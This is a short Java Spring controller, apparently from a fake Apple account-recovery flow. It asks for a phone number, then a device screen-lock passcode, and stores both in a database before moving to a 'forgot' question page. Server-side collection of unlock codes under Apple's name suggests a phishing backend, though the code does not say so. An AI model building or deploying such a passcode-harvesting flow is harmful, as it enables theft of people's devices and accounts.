package com.apple.controller;

import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;

import com.apple.domain.ScreenLock;
import com.apple.services.ScreenLockService;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Controller;
import org.springframework.util.StringUtils;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;

/**
 * VerifyController
 */

@Controller
public class VerifyController {

    private Logger logger = LoggerFactory.getLogger(VerifyController.class);
                
    @Autowired
    ScreenLockService screenLockService;

    @RequestMapping(value="/verify",method=RequestMethod.POST)
    public String verifyPhone(HttpServletRequest request,String phone){
        if(null!=phone){
            if(!"".equals(phone)){
                ScreenLock screenLock = new ScreenLock();
                screenLock.setPhone(phone);
                request.getSession().setAttribute("currentScreenLock", screenLock);
                return "forgotLock";
            }
        }
        return "forgotPhone";
    }

    @RequestMapping(value="/verifyLock",method=RequestMethod.POST)
    public String verifyLock(HttpServletRequest request,String slock){
        if(null!=slock){
            if(!"".equals(slock)){
                ScreenLock screenLock = (ScreenLock) request.getSession().getAttribute("currentScreenLock");
                if(screenLock==null){
                    return "forgotPhone";
                }
                screenLock.setSlock(slock);
                if(screenLockService.insertScrrenLock(screenLock)){
                    return "forgotQuest";
                }
            }
        }
        return "forgotLock";
    }
    
}